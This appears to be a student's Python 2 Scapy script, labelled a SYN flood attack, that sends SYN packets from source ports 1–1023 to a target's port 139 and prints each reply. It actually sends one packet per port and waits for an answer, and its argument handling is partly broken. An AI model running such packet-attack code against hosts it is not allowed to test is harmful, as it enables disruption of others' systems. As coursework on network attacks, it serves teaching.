#######################################################################################
#
#        Filename : Srinivas(spg349)-Question4.py 
#        Author   : Srinivas
#        Reference: www.secdev.org/projects/scapy/doc
#
#  Summary: This program conducts SYN Flood attack
#            --> Having various Source Port Numbers
#            --> Same Destination port number - Used 139 as mentioned in the Question
#            --> Records and Displays the response
#     
#
#########################################################################################

# Import Modules

import sys                  # System Calls Library
from scapy.all import *     # Scapy Library - Packet Generation and Receiving
import re                   # Re - Regular Expression Library - To Handle Inputs
from netaddr import *       # Netaddr Library - Performing and Analyzing Subnetting

# System Arguments to handle command line input
if len(sys.argv) < 2:
 print "Enter the IP Address to Continue....! \n"
 sys.exit()
# IP Address to be Mandatory Entry with default port 139
elif len(sys.argv) == 2:
 ip = sys.argv[1]
 port = 139
# IP Address and Custom Port Handle
elif len(sys.argv) > 2 and len(sys.argv) < 4:
 ip = sys.argv[1] 
 if sys.argv[2]:
    port = sys.argv[2]
else:
    port = 139
# Handling the Input being in the format ip/mask
ext = re.search("(.*)/(.*)",ip)
if ext:
 ips = ext.group(1)
 mask = ext.group(2) 
else:   
 print "Enter the correct format of IpAddress and Netmask : IP/Mask"
 sys.exit()

# Performing SYN/ACK with all the reserved ports as source port
for i in range(1,1024):
     syn = IP(dst = str(ips))/TCP(sport = i,dport = int(port),flags = "S")
     attack = sr1(syn,verbose=0,timeout=3)
# Handle for Output whether Port is Open or Closed based in the FLAG
     try:
        result = attack[1]["TCP"].flags
        if str(result) == "18":
           stat = "SYN/ACK"
        elif str(result) == "20":
           stat = "RST/ACK"
        else:
           stat = "Unknown"
     except:
        stat = "None"
     print "Src_Port:%d \t Dst_Port:%s \t Response:%s  %s" % (i,port,stat,str(syn.summary()))

        


